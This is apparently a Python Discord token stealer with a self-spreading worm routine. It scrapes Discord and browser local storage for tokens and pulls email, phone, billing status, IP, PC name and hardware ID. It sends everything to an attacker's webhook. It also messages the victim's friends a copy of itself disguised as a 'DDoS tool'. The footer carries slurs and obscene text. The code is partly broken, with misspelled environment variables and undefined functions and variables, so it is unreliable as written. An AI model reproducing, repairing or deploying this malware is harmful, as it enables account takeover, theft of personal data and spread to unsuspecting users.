import os 

from re import findall 
from json import loads, dumps 
from base64 import b64decode 
from subprocess import Popen, PIPE 
from urllib.request import Request, urlopen 
from threading import Thread 
from time import sleep 
from sys import argv 

WEBHOOKER_URL = "PASTE THAT SHIT HERE"

LOCAL = os.getenv("LOCALAPPD")
ROAMING = os.getenv("APPD")

PATHS = {
    "Discord": ROAMING + "\\Discord",
    "Discord Canary": ROAMING + "\\discordcanary",
    "Discord PTB": ROAMING + "\\discordptb",
    "Google Chrome": LOCAL + "\\Google\\Chrome\\User Data\\Default",
    "Opera": ROAMING + "\\Opera SOftware\\Opera Stable",
    "Brave": LOCAL + "\\BraveSoftware\\Brave-Browser\\User Data\\Default",
    "Yandex": LOCAL + "\\Yandex\\YandexBrowser\\User Data\\Default"
}

def getHead(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content-type,
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
    }

    if token:
        headers.update({"Authorization": token})
    return headers 

def getVictimData(token):
    try:
        return loads(
            urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=getHead(token))).read().decode())
    except:
        pass 

def getTokey(path):
    path += "\\Local Storage\\Leveldb"
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
            continue 
        for line in [x.strip() for x in open(f"{path}\\{file_name}", errors="ignore").readlines() if x.strip()]:
            for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w]{84}"):
                for token in findall(regex, line):
                    tokens.append(token)
    return tokens 


def whereYouAt():
    ip = "None"
    try:
        ip = urlopen(Request("https://ifconfig.me")).read().decode().strip()
    except:
        pass 
    return ip 

def hWid():
    p = Popen("wimc csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1]


def getHomies(token):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/relationships", headers=getHead(token))).read().decode())
    except:
        pass 

def getChatty(token, uid):
    try:
        return loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/channels", headers=getHead(token), data=dumps({"recipient_id": uid}).encode())).read().decode())["id"]
    
    except:
        pass

def getPaidSon(token):
    try:
        return bool(len(loads(urlopen(Request("https://discordapp.com/api/v6/users/@me/billing/payment-sources", 
        headers=getHead(token))).read().decode())) > 0)

    except:
        pass 

def sendMessages(token, chat_id, form_data):
    try:
        urlopen(Request(f"https://discordapp.com/api/v6/channels/{chat_id}/messages", headers=getHead(token, data=form_data.encode())).read().decode())

    except:
        pass

def std(token, form_data, delay):
    return # remove this shit to renable the std 
    for homie in getHomies(token):
        try:
            chat_id = getChatty(token, homie["id"])
            sendMessages(token, chat_id, form_data)
        except Exception as e:
            pass 
        sleep(delay) 


def main():
    cache_path = ROAMING + "\\.cache~$"
    prevent_spam = True 
    self_spread = True 
    embeds = []
    working = [] 
    checked = [] 
    already_cached_tokens = [] 
    working_ids = [] 
    ip = whereYouAt()
    pc_username = os.getenv("Username")
    pc_name = os.getenv("COMPUTERNAME") 
    user_path_name = os.getenv("userprofile").split("\\")[2]
    for platform, path in PATHS.items():
        if not os.path.exists(path):
            continue 
        for token in getTokey(path):
            if token in checked:
                continue 
            checked.append(token) 
            uid = None 
            if not token.startswith("mfa."):
                try:
                    uid = b64decode(token.split(".")[0].encode()).decode() 
                except:
                    pass 
                if not uid or uid in working_ids:
                    continue
                working_ids.append(uid)
                working.append(token)
                username = user_data["username"] + "@" + str(user_data["discriminator"])
                user_id = user_data["id"]
                email = user_data.get("email") 
                phone = user_data.get("phone") 
                nitro = bool(user_data.get("premium_type"))
                billing = bool(paymentMethods(token)) 
                embed = {
                    "color": 0x7289da,
                    "fields": [
                        {
                            "name": "Account Info",
                            "value": f'Email: {email}\nPhone: {phone}\nNitro: {nitro}\nBilling Info: {billing}',
                            "inline": True
                        },
                        {
                            "name": "PC Info",
                            "value": f'IP: {ip}\nUsername: {pc_username}\nPC Name: {pc_name}\nToken Location: {platform}',
                            "inline":True
                        },
                        {
                            "name": "Token",
                            "value": token,
                            "inline": False
                        }
                    ],
                    "author": {
                        "name": f"{username} ({user_id})",
                    },
                    "footer": {
                        "text": f"Developed by fagabond | discord.gg/suckmyfuckingcock666"
                    }
                }
                embeds.append(embed)
                with open(cache_path, "a") as file:
                    for token in checked:
                        if not token in already_cached_tokens:
                            file.write(token + "\n")
                if len(working) == 0:
                    working.append('123')
                webhook = {
                    "content": "",
                    "embeds": embeds,
                    "username": "cuckboi666",
                    
                }
                try:

                    urlopen(Request(WEBHOOKER_URL, data=dumps(webhook).encode(), headers=getHead()))
                except:
                    pass 
                if self_spread:
                    for token in working:
                        with open(argv[0], encoding="utf-8") as file:
                            content = file.read()
                        payload = f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{content}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nDDoS tool. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'
                        Thread(target=spread, args=(token, payload, 7500 / 1000)).start()


try:
    main() 
except Exception as e:
    print(e)
    pass 

             
 
